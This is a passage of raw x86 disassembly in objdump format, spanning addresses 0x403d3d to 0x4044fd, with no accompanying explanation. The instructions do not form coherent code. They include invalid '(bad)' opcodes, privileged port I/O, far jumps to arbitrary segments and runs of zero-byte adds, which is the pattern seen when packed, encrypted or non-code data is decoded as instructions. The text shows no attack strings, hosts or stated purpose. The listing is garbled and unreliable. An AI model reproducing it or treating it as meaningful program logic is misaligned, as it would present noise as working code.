  403d3d:	jns    0x403d14
  403d3f:	pusha  
  403d40:	and    al,0xef
  403d42:	ss push ecx
  403d44:	and    edi,ebx
  403d46:	test   al,0x6a
  403d48:	sbb    DWORD PTR [esi-0x41e520a6],ecx
  403d4e:	mov    esp,0xe9b322f4
  403d53:	test   BYTE PTR [edx],ah
  403d55:	or     DWORD PTR [edi-0x2a2de70a],0x6a
  403d5c:	sbb    esp,edx
  403d5e:	imul   ebp,ebp,0xfffffff7
  403d61:	jbe    0x403d63
  403d63:	test   ch,bh
  403d65:	inc    esi
  403d66:	jbe    0x403d63
  403d68:	add    eax,0xfe8dcc16
  403d6d:	and    eax,0x3b6dd652
  403d72:	mov    ebx,0x9d0b674a
  403d77:	les    ebp,FWORD PTR [edi+0x5a]
  403d7a:	pop    es
  403d7b:	push   ebp
  403d7c:	je     0x403de8
  403d7e:	jns    0x403d5b
  403d80:	sar    bh,1
  403d82:	adc    ch,dh
  403d84:	ror    edi,cl
  403d86:	add    BYTE PTR [eax],al
  403d88:	add    BYTE PTR [eax],al
  403d8a:	add    BYTE PTR [ebp+edi*4-0x6c016136],al
  403d91:	leave  
  403d92:	scas   al,BYTE PTR es:[edi]
  403d93:	pusha  
  403d94:	test   BYTE PTR [edi],bl
  403d96:	ret    0xb505
  403d99:	and    al,0xf2
  403d9b:	pop    ebx
  403d9c:	inc    esi
  403d9d:	push   ds
  403d9e:	mov    ds:0x93169b09,eax
  403da3:	outs   dx,DWORD PTR ds:[esi]
  403da4:	sbb    eax,0xd3cc05fa
  403da9:	stc    
  403daa:	xor    eax,0x6700eb52
  403daf:	lock popf 
  403db1:	add    edx,DWORD PTR [edi+0x66]
  403db4:	add    bh,BYTE PTR [eax+ebp*2+0x2f]
  403db8:	test   BYTE PTR [ebx+0x120eef6b],cl
  403dbe:	jae    0x403d5e
  403dc0:	push   esp
  403dc1:	fnsave [ecx+0x7e]
  403dc4:	jmp    0xce84:0x89ebd55a
  403dcb:	adc    edi,eax
  403dcd:	hlt    
  403dce:	(bad)  
  403dcf:	pop    edx
  403dd0:	outs   dx,BYTE PTR ds:[esi]
  403dd1:	loop   0x403d9f
  403dd3:	and    ah,ah
  403dd5:	outs   dx,BYTE PTR ds:[esi]
  403dd6:	aam    0x27
  403dd8:	iret   
  403dd9:	pop    eax
  403dda:	iret   
  403ddb:	pop    ss
  403ddc:	inc    ecx
  403ddd:	rol    esi,0xe6
  403de0:	stos   BYTE PTR es:[edi],al
  403de1:	out    dx,al
  403de2:	int    0xf6
  403de4:	adc    al,0x68
  403de6:	imul   eax,DWORD PTR [ebx+0x5b6a37b7],0x73c649
  403df0:	add    BYTE PTR [eax],al
  403df2:	add    BYTE PTR [eax],al
  403df4:	and    BYTE PTR [ebx+0x2dba70d1],0x71
  403dfb:	sti    
  403dfc:	pushf  
  403dfd:	pushf  
  403dfe:	push   ds
  403dff:	clc    
  403e00:	pop    esp
  403e01:	xor    cl,BYTE PTR [edi-0x74751ff]
  403e07:	add    ch,BYTE PTR [esi+0x46]
  403e0a:	jbe    0x403e2a
  403e0c:	sti    
  403e0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e0e:	add    DWORD PTR ds:0x1c881c23,esp
  403e14:	retf   0xd7d1
  403e17:	pop    ss
  403e18:	mov    dl,0x3f
  403e1a:	mov    edx,edi
  403e1c:	aam    0x2a
  403e1e:	mov    dh,0xf9
  403e20:	les    edx,FWORD PTR [edi+eiz*1+0x104ef600]
  403e27:	add    esp,esi
  403e29:	ror    BYTE PTR [esi-0x66dcace1],0x24
  403e30:	imul   ebp,DWORD PTR [ebp+0x3d682000],0x4d
  403e37:	out    dx,eax
  403e38:	push   0xa057db2d
  403e3d:	sbb    BYTE PTR [edx-0x40],cl
  403e40:	inc    ebx
  403e41:	dec    eax
  403e42:	fsubr  QWORD PTR [ecx]
  403e44:	xor    bh,cl
  403e46:	gs (bad) 
  403e48:	cs jmp 0x550d8f3d
  403e4e:	push   ebx
  403e4f:	lahf   
  403e50:	fiadd  WORD PTR [ebp+eax*8+0x7fb5c72e]
  403e57:	mov    ecx,0x0
  403e5c:	add    ch,al
  403e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e5f:	jmp    0x1cf10b08
  403e64:	xor    ebx,DWORD PTR [edi-0x58457540]
  403e6a:	xchg   ecx,eax
  403e6b:	xor    BYTE PTR ds:0x83a661a5,al
  403e71:	inc    ecx
  403e72:	in     al,dx
  403e73:	add    al,0x2c
  403e75:	inc    edx
  403e76:	cld    
  403e77:	xchg   edx,eax
  403e78:	popf   
  403e79:	xor    BYTE PTR [ebp+0x29],cl
  403e7c:	or     dh,BYTE PTR [eax]
  403e7e:	sbb    eax,0x285b5abf
  403e83:	cs and eax,0xb4b83898
  403e89:	mov    cs,WORD PTR [ecx]
  403e8b:	add    al,bl
  403e8d:	mov    ebx,ecx
  403e8f:	xchg   ebx,eax
  403e90:	cmp    eax,0x2a3766de
  403e95:	int    0x76
  403e97:	mov    eax,ds:0x1bc57593
  403e9c:	mov    esp,0xe98d9574
  403ea1:	jbe    0x403ea5
  403ea3:	add    BYTE PTR [eax],al
  403ea5:	jle    0x403e9a
  403ea7:	inc    eax
  403ea8:	sbb    ebx,DWORD PTR [ebx-0x43fd7dde]
  403eae:	dec    edi
  403eaf:	ret    
  403eb0:	add    BYTE PTR [eax],ch
  403eb2:	or     al,ch
  403eb4:	add    al,0x51
  403eb6:	aad    0xf3
  403eb8:	inc    ebp
  403eb9:	push   0x38
  403ebb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ebc:	xchg   BYTE PTR [ebx+0x3f],ah
  403ebf:	xchg   esi,eax
  403ec0:	mov    DWORD PTR [eax],0x0
  403ec6:	les    esi,FWORD PTR [ebp-0x3dd2f776]
  403ecc:	mov    ebx,0xe88d0649
  403ed1:	mov    ch,bh
  403ed3:	push   ebx
  403ed4:	fxch   st(3)
  403ed6:	shl    BYTE PTR [edx],0x4f
  403ed9:	or     al,0x89
  403edb:	dec    ebp
  403edc:	jle    0x403f2b
  403ede:	mov    ds:0xdb8e2d80,al
  403ee3:	ja     0x403f01
  403ee5:	iret   
  403ee6:	push   es
  403ee7:	ret    0x5112
  403eea:	out    dx,eax
  403eeb:	mov    dh,0x23
  403eed:	adc    BYTE PTR [esp+edx*2+0x70],al
  403ef1:	shr    DWORD PTR ds:0x8292418d,cl
  403ef7:	dec    esp
  403ef8:	xlat   BYTE PTR ds:[ebx]
  403ef9:	push   ebp
  403efa:	or     esi,DWORD PTR [ebx]
  403efc:	out    0x14,al
  403efe:	and    BYTE PTR [eax-0x4b],bh
  403f01:	xlat   BYTE PTR ds:[ebx]
  403f02:	sbb    DWORD PTR [ecx-0x771697c],eax
  403f08:	xchg   edi,eax
  403f09:	pop    ecx
  403f0a:	idiv   edi
  403f0c:	test   al,0x18
  403f0e:	dec    esp
  403f0f:	retf   0xdbf9
  403f12:	xor    eax,0x6a9aca95
  403f17:	aam    0x5c
  403f19:	pop    ebp
  403f1a:	ror    DWORD PTR [esp+ebp*2],cl
  403f1d:	sbb    al,0x68
  403f1f:	ds aas 
  403f21:	fbld   TBYTE PTR [ecx+0x39]
  403f24:	push   cs
  403f25:	sahf   
  403f26:	cmp    DWORD PTR [edx+0xa224],eax
  403f2c:	add    BYTE PTR [eax],al
  403f2e:	add    BYTE PTR [eax],ah
  403f30:	jge    0x403f47
  403f32:	jecxz  0x403fa9
  403f34:	je     0x403fa8
  403f36:	inc    esi
  403f37:	push   ebp
  403f38:	jae    0x403f95
  403f3a:	ja     0x403f50
  403f3c:	push   0xffffff9c
  403f3e:	loope  0x403f1b
  403f40:	shl    DWORD PTR [ecx-0x39a76d30],1
  403f46:	sbb    DWORD PTR [ecx-0x71],0xffffffbf
  403f4a:	mov    dl,0x10
  403f4c:	ds inc edi
  403f4e:	scas   al,BYTE PTR es:[edi]
  403f4f:	pop    ds
  403f50:	fnstsw WORD PTR ds:0x18fc5e9f
  403f56:	int3   
  403f57:	lea    ecx,[ebx]
  403f59:	xor    al,0xfd
  403f5b:	int3   
  403f5c:	ret    0x6af2
  403f5f:	and    edi,DWORD PTR [ecx-0x5fa5a627]
  403f65:	cld    
  403f66:	or     BYTE PTR [ecx-0x37c7f839],dl
  403f6c:	cmp    al,0x3e
  403f6e:	ss fild DWORD PTR es:[esi+0x7]
  403f73:	out    0x3d,eax
  403f75:	xor    al,0x54
  403f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f78:	dec    ebp
  403f79:	sbb    DWORD PTR [ebp+0x65],esp
  403f7c:	sbb    dl,0xf2
  403f7f:	or     dh,BYTE PTR [edi-0xd]
  403f82:	rol    ebx,0x21
  403f85:	or     BYTE PTR [ecx-0x6002b678],dl
  403f8b:	inc    ecx
  403f8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f8d:	test   BYTE PTR [esi+ebp*8+0x8d7f92],bh
  403f94:	add    BYTE PTR [eax],al
  403f96:	add    BYTE PTR [eax],al
  403f98:	das    
  403f99:	mov    dh,0x5a
  403f9b:	ficomp WORD PTR [ebp+esi*4+0x71]
  403f9f:	out    dx,eax
  403fa0:	popf   
  403fa1:	sub    BYTE PTR [eax-0x64712d87],dh
  403fa7:	dec    eax
  403fa8:	or     ebx,DWORD PTR [edx-0x42]
  403fab:	sbb    eax,DWORD PTR [eax-0x6f]
  403fae:	lds    ebp,FWORD PTR [edx]
  403fb0:	jns    0x403fb4
  403fb2:	fldcw  WORD PTR [edx]
  403fb4:	inc    edx
  403fb5:	std    
  403fb6:	iret   
  403fb7:	and    DWORD PTR [ebx],ebp
  403fb9:	ds stos DWORD PTR es:[edi],eax
  403fbb:	xor    al,0x50
  403fbd:	jnp    0x403f71
  403fbf:	dec    edi
  403fc0:	jns    0x403f7e
  403fc2:	pop    ebp
  403fc3:	push   cs
  403fc4:	inc    DWORD PTR [eax]
  403fc6:	ins    BYTE PTR es:[edi],dx
  403fc7:	cmc    
  403fc8:	iret   
  403fc9:	inc    ecx
  403fca:	(bad)  
  403fcb:	loopne 0x403f67
  403fcd:	jle    0x40403d
  403fcf:	jmp    0x403f6e
  403fd1:	mov    edi,0x103863e1
  403fd6:	enter  0x6168,0x4f
  403fda:	jecxz  0x403f69
  403fdc:	sbb    dl,BYTE PTR [edx-0x2efc8906]
  403fe2:	and    eax,0x240b75b8
  403fe7:	int    0x84
  403fe9:	dec    edx
  403fea:	pop    es
  403feb:	stos   BYTE PTR es:[edi],al
  403fec:	xlat   BYTE PTR ds:[ebx]
  403fed:	(bad)  
  403fee:	mul    BYTE PTR [edx+0x68a3cca6]
  403ff4:	shl    BYTE PTR [esi],1
  403ff6:	mov    ah,BYTE PTR [ebx-0x67]
  403ff9:	mul    DWORD PTR [eax+0x76]
  403ffc:	add    BYTE PTR [eax],al
  403ffe:	add    BYTE PTR [eax],al
  404000:	add    BYTE PTR [edx-0x48],ah
  404003:	js     0x403f92
  404005:	imul   edi,DWORD PTR [ecx+0x27],0xffffffcc
  404009:	in     eax,dx
  40400a:	xor    ah,BYTE PTR [esi]
  40400c:	mov    bh,0xdc
  40400e:	repz inc esp
  404010:	mov    ds:0xa934b4ff,al
  404015:	cs jbe 0x403fb3
  404018:	and    edx,ecx
  40401a:	ds xchg edx,eax
  40401c:	sub    dl,bl
  40401e:	jmp    FWORD PTR [eax-0x4f3ed7b1]
  404024:	xor    al,0xf1
  404026:	sbb    edi,0xee3a64f5
  40402c:	push   cs
  40402d:	xchg   esi,eax
  40402e:	sti    
  40402f:	dec    esp
  404031:	into   
  404032:	xor    edx,ebx
  404034:	lods   al,BYTE PTR ds:[esi]
  404035:	aad    0x42
  404037:	fwait
  404038:	dec    esp
  404039:	aam    0x2d
  40403b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40403c:	pop    ebp
  40403d:	fistp  QWORD PTR [esi+eiz*8]
  404040:	ds mov dl,0xb
  404043:	and    eax,0x63dae11f
  404048:	call   0xe1e3b056
  40404d:	clc    
  40404e:	and    edx,0x21ce0ffa
  404054:	add    edx,DWORD PTR ds:0x5d54609f
  40405a:	mov    ds:0xd15655af,al
  40405f:	out    dx,al
  404060:	jbe    0x4040cd
  404062:	test   BYTE PTR ds:0x67,ch
  404068:	add    BYTE PTR [eax],al
  40406a:	push   0xc1b06c54
  40406f:	out    0xaa,al
  404071:	cdq    
  404072:	xor    bh,0xe9
  404075:	jb     0x40400e
  404077:	dec    eax
  404078:	sub    DWORD PTR [ebx+0x1668198c],ecx
  40407e:	push   ss
  40407f:	sbb    dh,dh
  404081:	pop    ss
  404082:	sbb    eax,0x71f4b749
  404087:	std    
  404088:	jae    0x40406f
  40408a:	and    bl,ch
  40408c:	xor    al,0xb2
  40408e:	dec    ebx
  40408f:	pop    esi
  404090:	repnz fwait
  404092:	mov    esi,0x4db0b38f
  404097:	shl    BYTE PTR [eax-0x37],0x54
  40409b:	mov    cl,0x31
  40409d:	push   cs
  40409e:	pop    ds
  40409f:	xchg   ebp,eax
  4040a0:	(bad)  
  4040a1:	pop    ds
  4040a2:	adc    al,0xc4
  4040a4:	mov    edi,0x7c73293c
  4040a9:	sbb    eax,0x3d61aa
  4040ae:	pop    edi
  4040af:	nop
  4040b0:	ss cli 
  4040b2:	push   esi
  4040b3:	pop    ss
  4040b4:	pop    es
  4040b5:	mov    ebx,0x7854227d
  4040ba:	xor    al,0x2d
  4040bc:	cmp    DWORD PTR gs:[edi-0x77],edx
  4040c0:	cwde   
  4040c1:	dec    ebx
  4040c2:	jle    0x4040e2
  4040c4:	test   eax,0xfa39950a
  4040c9:	leave  
  4040ca:	pushf  
  4040cb:	adc    cl,bl
  4040cd:	mov    BYTE PTR [eax],al
  4040cf:	add    BYTE PTR [eax],al
  4040d1:	add    BYTE PTR [eax],al
  4040d3:	pop    ebx
  4040d4:	push   ebp
  4040d5:	pop    ebp
  4040d6:	dec    edi
  4040d7:	push   edx
  4040d8:	jp     0x404146
  4040da:	push   cs
  4040db:	cmp    DWORD PTR [edi+0x3f],ebx
  4040de:	int    0x40
  4040e0:	enter  0x8c0e,0xf
  4040e4:	ficom  WORD PTR [ecx]
  4040e6:	inc    ebx
  4040e7:	push   es
  4040e8:	inc    edi
  4040e9:	and    eax,DWORD PTR [edx]
  4040eb:	or     eax,0x24c16ff0
  4040f0:	std    
  4040f1:	inc    eax
  4040f2:	xor    BYTE PTR [ebx-0x25b82947],0x92
  4040f9:	in     eax,0x6
  4040fb:	mov    cl,0x3
  4040fd:	mov    ch,0xc5
  4040ff:	mov    BYTE PTR [eax+0x474d8483],ah
  404105:	mov    bl,BYTE PTR [edx]
  404107:	inc    esp
  404108:	fidivr WORD PTR [edx-0x180330a5]
  40410e:	cwde   
  40410f:	out    0xef,al
  404111:	fcomp  st(1)
  404113:	xor    DWORD PTR [ebx-0x45e7e1b2],edx
  404119:	jge    0x40417a
  40411b:	jae    0x4040bc
  40411d:	sub    al,0x9c
  40411f:	or     al,BYTE PTR [esp+ebx*1]
  404122:	fst    QWORD PTR [ebp+0x1b]
  404125:	add    BYTE PTR [edx],dl
  404127:	cmp    al,0x88
  404129:	xor    DWORD PTR [ebx+0x75],edx
  40412c:	and    al,0x71
  40412e:	bound  eax,QWORD PTR ds:0xa453581c
  404134:	out    0x96,al
  404136:	lds    eax,FWORD PTR [eax]
  404138:	add    BYTE PTR [eax],al
  40413a:	add    BYTE PTR [eax],al
  40413c:	arpl   bp,sp
  40413e:	mov    cl,0xf4
  404140:	sub    cl,BYTE PTR [eax]
  404142:	lds    esp,FWORD PTR [edi-0x6944681f]
  404148:	enter  0x977,0xbc
  40414c:	pushf  
  40414d:	js     0x40414f
  40414f:	(bad)  
  404150:	int    0x15
  404152:	rcr    ebp,cl
  404154:	push   cs
  404155:	es out dx,al
  404157:	out    dx,al
  404158:	pop    edi
  404159:	push   ebx
  40415a:	sub    eax,0x147c9879
  40415f:	dec    eax
  404160:	rcl    DWORD PTR [ecx+0x3f],1
  404163:	sbb    ecx,DWORD PTR [edx]
  404165:	retf   0x2a4a
  404168:	mov    ds:0x5436c20f,eax
  40416d:	add    bh,al
  40416f:	pop    es
  404170:	adc    eax,0xd654abdd
  404175:	(bad)  
  404176:	xchg   esp,eax
  404177:	gs xchg edi,eax
  404179:	stos   DWORD PTR es:[edi],eax
  40417a:	push   ebp
  40417b:	repz push eax
  40417d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40417e:	push   0xffffffc2
  404180:	sbb    DWORD PTR [ecx-0x79],ebx
  404183:	xchg   ecx,eax
  404184:	rol    dl,cl
  404186:	and    BYTE PTR [eax-0x5138b2a5],0xed
  40418d:	cmp    eax,0xdf1c9fc2
  404192:	xchg   esp,eax
  404193:	int3   
  404194:	pop    edi
  404195:	add    BYTE PTR [ebp+edi*8+0x6b6b298e],ch
  40419c:	leave  
  40419d:	and    DWORD PTR [esi+0x5a],edx
  4041a0:	add    BYTE PTR [eax],al
  4041a2:	add    BYTE PTR [eax],al
  4041a4:	add    BYTE PTR [eax],al
  4041a6:	sbb    eax,DWORD PTR [ecx-0x777bc4f7]
  4041ac:	cmp    BYTE PTR [edx+0x2],dh
  4041af:	aad    0xff
  4041b1:	xchg   esi,eax
  4041b2:	push   edx
  4041b3:	aam    0x8
  4041b5:	mov    BYTE PTR [ecx-0x2bcf1209],dl
  4041bb:	in     eax,0xd2
  4041bd:	dec    ebx
  4041be:	adc    esi,DWORD PTR [ecx-0x67aa2bed]
  4041c4:	sub    al,0xa5
  4041c6:	xchg   esp,eax
  4041c7:	jae    0x404212
  4041c9:	not    bh
  4041cb:	mov    DWORD PTR [esi],edi
  4041cd:	out    0x16,eax
  4041cf:	mov    dl,0x9d
  4041d1:	ret    0xbb4f
  4041d4:	mov    ds:0xcfd00e9b,al
  4041d9:	loopne 0x4041a8
  4041db:	leave  
  4041dc:	mov    eax,0x79968cf9
  4041e1:	addr16 dec esp
  4041e3:	ja     0x404173
  4041e5:	push   esi
  4041e6:	or     edx,DWORD PTR [ebx+eiz*2+0x5]
  4041ea:	retf   0x5c65
  4041ed:	mov    ah,0x8b
  4041ef:	jmp    0xcedc:0x344c9e4
  4041f6:	add    eax,0xc69bf6d8
  4041fb:	rcl    DWORD PTR [ecx],0x83
  4041fe:	xchg   DWORD PTR [esi],ecx
  404200:	push   ecx
  404201:	in     eax,dx
  404202:	inc    eax
  404203:	push   DWORD PTR [edi]
  404205:	or     al,0x2
  404207:	sbb    al,0x1b
  404209:	add    BYTE PTR [eax],al
  40420b:	add    BYTE PTR [eax],al
  40420d:	add    BYTE PTR [edi],bh
  40420f:	ret    
  404210:	sbb    eax,0x68843e26
  404215:	(bad)  [ecx]
  404217:	inc    BYTE PTR [eax-0x65c2d91c]
  40421d:	adc    edx,edx
  40421f:	jg     0x4041a4
  404221:	imul   al
  404223:	mov    esi,0xf975374c
  404228:	cmp    al,0x50
  40422a:	inc    esp
  40422b:	cmp    BYTE PTR [eax],al
  40422d:	push   ds
  40422e:	push   eax
  40422f:	and    BYTE PTR [ecx-0x27ce70e1],bl
  404235:	mov    al,0x17
  404237:	dec    esi
  404238:	pop    ss
  404239:	mov    ecx,0x92561d00
  40423e:	sbb    eax,0xc28b94f0
  404243:	(bad)  
  404244:	rcl    esp,cl
  404246:	sti    
  404247:	mov    BYTE PTR [ebx],dl
  404249:	mov    ch,0x3c
  40424b:	pop    ecx
  40424c:	push   edx
  40424d:	(bad)  
  40424e:	sbb    DWORD PTR [edx-0x44e9186f],ebp
  404254:	rol    BYTE PTR [edi-0x75],1
  404257:	xchg   ecx,eax
  404258:	in     al,dx
  404259:	es dec esp
  40425b:	shr    BYTE PTR [ebp+0x6e732945],0x54
  404262:	inc    esi
  404263:	bound  ebp,QWORD PTR [edi]
  404265:	add    eax,DWORD PTR [edi+0x700ae7d7]
  40426b:	add    eax,0x3192e1a9
  404270:	push   0xffffffd8
  404272:	add    BYTE PTR [eax],al
  404274:	add    BYTE PTR [eax],al
  404276:	add    BYTE PTR [ebx+0x26],dl
  404279:	sub    edi,DWORD PTR [edi-0x2e]
  40427c:	sbb    esp,esp
  40427e:	outs   dx,BYTE PTR ds:[esi]
  40427f:	aad    0x4a
  404281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404282:	dec    ebp
  404283:	loopne 0x40427e
  404285:	gs dec esp
  404287:	jmp    edi
  404289:	es jnp 0x4042ca
  40428c:	pop    esi
  40428d:	loopne 0x404221
  40428f:	or     DWORD PTR [edi-0x43eb565f],ecx
  404295:	bound  edx,QWORD PTR [eax-0x2dc5325]
  40429b:	retf   0xbda3
  40429e:	in     al,dx
  40429f:	fwait
  4042a0:	mov    dl,0xfc
  4042a2:	pxor   mm0,QWORD PTR [eax+0x50880e3f]
  4042a9:	jle    0x4042ab
  4042ab:	int3   
  4042ac:	push   eax
  4042ad:	and    al,0xb9
  4042af:	and    eax,0xcef815c8
  4042b4:	inc    si
  4042b6:	cmp    eax,DWORD PTR [edi]
  4042b8:	bound  esi,QWORD PTR [edi+0x7a]
  4042bb:	xor    bl,ch
  4042bd:	push   0xffffffb5
  4042bf:	cdq    
  4042c0:	cld    
  4042c1:	pop    ecx
  4042c2:	hlt    
  4042c3:	jb     0x404296
  4042c5:	or     BYTE PTR [edi],dh
  4042c7:	imul   ecx,DWORD PTR [esi+0x38],0x76
  4042cb:	xor    al,0xf
  4042cd:	scas   al,BYTE PTR es:[edi]
  4042ce:	mov    cl,0x2d
  4042d0:	nop
  4042d1:	sahf   
  4042d2:	lock push esi
  4042d4:	mov    ebp,0xaa4f33cb
  4042d9:	cld    
  4042da:	jb     0x4042dc
  4042dc:	add    BYTE PTR [eax],al
  4042de:	add    BYTE PTR [eax],al
  4042e0:	pushf  
  4042e1:	add    BYTE PTR [eax],al
  4042e3:	add    BYTE PTR [ebp-0x70c8953e],cl
  4042e9:	test   ah,dl
  4042eb:	outs   dx,BYTE PTR ds:[esi]
  4042ec:	sahf   
  4042ed:	inc    esi
  4042ee:	mov    esi,0xa80d9b59
  4042f3:	fcomp  QWORD PTR [edx-0x77143d39]
  4042f9:	jno    0x404377
  4042fb:	mov    dl,0x59
  4042fd:	dec    ebp
  4042fe:	push   ss
  4042ff:	test   DWORD PTR [edx-0x6f],esp
  404302:	push   eax
  404303:	mov    eax,0x8f3b5753
  404308:	push   ecx
  404309:	adc    eax,0xdb30d685
  40430e:	out    dx,al
  40430f:	loope  0x404356
  404311:	call   0x5393:0x584464f8
  404318:	push   esi
  404319:	push   ds
  40431a:	sub    eax,0x46dc170a
  40431f:	cmp    eax,0x70a2a470
  404324:	and    DWORD PTR [ecx+ecx*8+0x47],esp
  404328:	jne    0x4042be
  40432a:	popa   
  40432b:	ja     0x4043a0
  40432d:	stos   DWORD PTR es:[edi],eax
  40432e:	and    ebx,DWORD PTR ds:0xaeea05c
  404334:	rcr    DWORD PTR [edi-0x4e219e50],1
  40433a:	push   0xffffffdf
  40433c:	mov    bh,0xb2
  40433e:	sub    al,0xb5
  404340:	loopne 0x4042d9
  404342:	fdiv   st,st(1)
  404344:	add    BYTE PTR [eax],al
  404346:	add    BYTE PTR [eax],al
  404348:	add    BYTE PTR [ebp-0x25676968],ch
  40434e:	call   0x4c12:0x9a1b2654
  404355:	in     al,0xbe
  404357:	fistp  WORD PTR [ecx+0x69]
  40435a:	mov    ch,0x9d
  40435c:	xor    BYTE PTR [esi+0x2f8e5bbb],dl
  404362:	mov    ah,0x19
  404364:	in     al,0x38
  404366:	loope  0x4043b6
  404368:	inc    esi
  404369:	xchg   ebp,eax
  40436a:	loop   0x4042f8
  40436c:	sub    al,0xc2
  40436e:	lock retf 0x392
  404372:	lock or al,bh
  404375:	int3   
  404376:	add    al,0x48
  404378:	out    dx,al
  404379:	inc    ecx
  40437a:	fwait
  40437b:	test   DWORD PTR [esi+ebp*2-0x38c53c6b],eax
  404382:	scas   al,BYTE PTR es:[edi]
  404383:	add    DWORD PTR [eax-0x30],edx
  404386:	mov    ebx,0xb4bd173d
  40438b:	jg     0x40440a
  40438d:	retf   0xb9be
  404390:	ret    
  404391:	mov    esi,DWORD PTR [ebp+0x5a74a8fb]
  404397:	xor    al,0xbf
  404399:	stc    
  40439a:	pop    eax
  40439b:	jbe    0x404372
  40439d:	push   es
  40439e:	push   edi
  40439f:	mov    al,0x6b
  4043a1:	pop    ds
  4043a2:	pop    eax
  4043a3:	repnz add BYTE PTR [eax+0x2],cl
  4043a7:	or     eax,0x4721829
  4043ac:	imul   eax,DWORD PTR [eax],0x0
  4043af:	add    BYTE PTR [eax],al
  4043b1:	add    dl,ch
  4043b3:	bound  ecx,QWORD PTR [esi]
  4043b5:	lods   eax,DWORD PTR ds:[esi]
  4043b6:	inc    esp
  4043b7:	pushf  
  4043b8:	pop    es
  4043b9:	out    dx,eax
  4043ba:	scas   eax,DWORD PTR es:[edi]
  4043bb:	leave  
  4043bc:	or     ah,BYTE PTR [edx]
  4043be:	mov    al,0x4e
  4043c0:	or     esp,DWORD PTR [edx+edx*2+0x17]
  4043c4:	or     DWORD PTR [esi-0x17f81ff4],esp
  4043ca:	out    0xf4,eax
  4043cc:	rcr    BYTE PTR [ebx],cl
  4043ce:	sub    edx,ebp
  4043d0:	rcr    DWORD PTR [ecx-0x45],1
  4043d3:	cli    
  4043d4:	mov    edi,0xc144559f
  4043d9:	fnstsw WORD PTR [ecx+edx*1-0x2c]
  4043dd:	adc    ah,BYTE PTR [ecx-0x6a]
  4043e0:	int    0x50
  4043e2:	inc    ebx
  4043e3:	mov    edi,0x77bd96c7
  4043e8:	mov    esi,0x596cd4d4
  4043ed:	jp     0x4043df
  4043ef:	rcr    DWORD PTR [eax+0x3c],0x92
  4043f3:	xchg   edx,eax
  4043f4:	pop    edx
  4043f5:	(bad)  
  4043f6:	sub    eax,0x46c05b6c
  4043fb:	jns    0x40443b
  4043fd:	jno    0x404457
  4043ff:	(bad)  
  404400:	xor    ebp,DWORD PTR ss:[edx]
  404403:	out    0x3c,eax
  404405:	cmc    
  404406:	gs adc eax,0x400eb734
  40440c:	daa    
  40440d:	mov    eax,DWORD PTR [ecx+0x1b]
  404410:	push   ds
  404411:	dec    ecx
  404412:	and    ecx,DWORD PTR [edx+0x14]
  404415:	sldt   WORD PTR [eax]
  404418:	add    BYTE PTR [eax],al
  40441a:	add    BYTE PTR [ebp-0x10],bh
  40441d:	or     al,0xcd
  40441f:	xlat   BYTE PTR ds:[ebx]
  404420:	jecxz  0x404421
  404422:	or     ecx,0x5e
  404425:	add    DWORD PTR [edx+0x5b],eax
  404428:	jne    0x40442a
  40442a:	repz jp 0x40448f
  40442d:	retf   0x30f2
  404430:	int    0xfd
  404432:	aad    0xc2
  404434:	call   0x3eb910e8
  404439:	xchg   esi,eax
  40443b:	cs pushf 
  40443d:	fidivr WORD PTR [edi-0x2d168d14]
  404443:	stos   DWORD PTR es:[edi],eax
  404444:	sub    BYTE PTR [ebx+edx*8+0x61],0xa6
  404449:	pop    ebx
  40444a:	rol    edi,0x33
  40444d:	add    al,al
  40444f:	add    eax,0x518b34db
  404454:	sbb    DWORD PTR [eax],ecx
  404456:	mov    cl,BYTE PTR [ebx-0x2277c111]
  40445c:	ins    BYTE PTR es:[edi],dx
  40445d:	mov    WORD PTR [edi],bx
  404460:	les    edx,FWORD PTR [ecx-0x74]
  404463:	pop    eax
  404464:	mov    cl,0xd4
  404466:	test   DWORD PTR [edx-0x6b701ca9],edx
  40446c:	add    al,0xba
  40446e:	xchg   dh,dl
  404470:	sub    ecx,DWORD PTR [ebp+0x20cde631]
  404476:	xor    BYTE PTR [edx+eiz*2-0x6b5dde9],ah
  40447d:	dec    ebp
  40447e:	and    eax,DWORD PTR [eax]
  404480:	add    BYTE PTR [eax],al
  404482:	add    BYTE PTR [eax],al
  404484:	add    BYTE PTR [edi],cl
  404486:	jns    0x4044be
  404488:	mov    edi,0x7d2ffc25
  40448d:	or     cl,bl
  40448f:	and    eax,0x1c9251b3
  404494:	jmp    0x356fea50
  404499:	jl     0x404433
  40449b:	es ja  0x404430
  40449e:	scas   eax,DWORD PTR es:[edi]
  40449f:	sub    al,0xb9
  4044a1:	dec    eax
  4044a2:	mul    BYTE PTR ds:0xc0ddf3
  4044a8:	(bad)  
  4044a9:	retf   
  4044aa:	xor    al,BYTE PTR [esp+ecx*4+0xd]
  4044ae:	pop    eax
  4044af:	jae    0x40450f
  4044b1:	inc    edi
  4044b2:	out    0x2a,al
  4044b4:	pop    edi
  4044b5:	mov    DWORD PTR [ebp+ebx*1+0x50686de0],ecx
  4044bc:	loope  0x40446d
  4044be:	add    DWORD PTR [edi-0x2d],esp
  4044c1:	icebp  
  4044c2:	mov    ebx,0xd633c23e
  4044c7:	or     edi,ebx
  4044c9:	jl     0x40448b
  4044cb:	mov    esi,ds
  4044cd:	mov    dh,0xa9
  4044cf:	mov    ebx,0xe213f10c
  4044d4:	or     eax,0xb6d57e3b
  4044d9:	pop    esi
  4044da:	cmp    eax,ebp
  4044dc:	mov    bh,0xa4
  4044de:	push   edx
  4044df:	fild   WORD PTR ds:0x486ece3
  4044e5:	cmp    DWORD PTR [edi+0xb1],eax
  4044eb:	add    BYTE PTR [eax],al
  4044ed:	sbb    DWORD PTR [eax-0x6f],ebp
  4044f0:	xor    al,0xd8
  4044f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044f3:	cli    
  4044f4:	add    ecx,DWORD PTR [edx]
  4044f6:	in     al,dx
  4044f7:	inc    esp
  4044f8:	pop    edx
  4044f9:	sti    
  4044fa:	sub    DWORD PTR [edi],ebp
  4044fc:	ins    DWORD PTR es:[edi],dx
  4044fd:	lods   eax,DWORD PTR ds:[esi]
